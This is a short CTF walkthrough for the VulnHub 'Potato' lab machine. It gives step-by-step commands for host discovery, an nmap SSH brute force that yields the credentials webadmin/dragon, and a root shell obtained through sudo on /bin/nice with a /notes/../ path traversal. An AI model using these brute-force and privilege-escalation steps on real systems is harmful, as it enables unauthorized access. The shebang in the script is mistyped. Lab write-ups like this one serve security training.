# VulnHub Walkthrough: 🥔 Potato

## Part 1

1. Find Target: `netdiscover -r <Kali IP>`

2. Scan the target network: 
     * `nmap -A -p0-65535 <IP>`
     * Open ports: SSH, TCP, FTP

3. Brute-force SSH using nmap script
     * `nmap -vv -script=ssh-brute.nse -p 22 <IP>`     * -vv: Increased verbosity
     * -script: nmap script
     * -p: target port
     * Found Credentials - username: ***webadmin*** | password: ***dragon***

4. Login to SSH using found credentials
     * `ssh webadmin@<target ip> -p 22` --> password: dragon

5. Next use ls to reveal users.txt: `ls -halt`

6. Run `sudo -l` to see what permissions the user has.

## Part 2

7. Discover that the *webadmin* can use ==> `/bin/nice` & `/notes/*`

8. So `/bin/nice` can be used to execute, then files in the `/notes/*` can be executed
     * Knowing this, we create a simple script, `root.sh`, that will deploy a bash shell:
```sh
#/bin/bash
bash -e
```

9. We can use the following command to deploy the script:
     * `sudo /bin/nice /notes/../home/webadmin/root.sh` (you may need to `chmod +x root.sh` beforehand.

10. You're in. `cat /root/root.txt`
